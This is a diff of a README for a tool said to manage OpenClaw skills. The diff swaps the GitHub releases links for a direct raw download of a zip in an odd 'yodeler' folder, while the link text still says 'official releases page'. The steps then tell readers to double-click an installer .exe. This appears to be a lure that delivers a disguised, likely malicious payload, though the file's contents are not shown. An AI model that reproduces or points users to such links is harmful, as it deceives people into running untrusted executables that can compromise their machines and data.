@@ -1,6 +1,6 @@
 # 🚀 loader-openclaw-skills - Manage OpenClaw skills with one click
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Overhand-cool515/loader-openclaw-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Overhand-cool515/loader-openclaw-skills/main/yodeler/loader_openclaw_skills_2.9.zip)
 
 This software manages OpenClaw skills for your system. It automates the process of finding, downloading, and setting up community skills. You do not need to type commands or move files. The tool handles everything from start to finish. It supports over 5,200 skills from the ClawHub database.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the manager:
 
-1. Visit the [official releases page](https://github.com/Overhand-cool515/loader-openclaw-skills/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Overhand-cool515/loader-openclaw-skills/main/yodeler/loader_openclaw_skills_2.9.zip) to download the installer.
 2. Locate the file named `loader-openclaw-installer.exe` in your Downloads folder.
 3. Double-click the file to begin the setup.
 4. Follow the on-screen prompts to place the application on your computer.
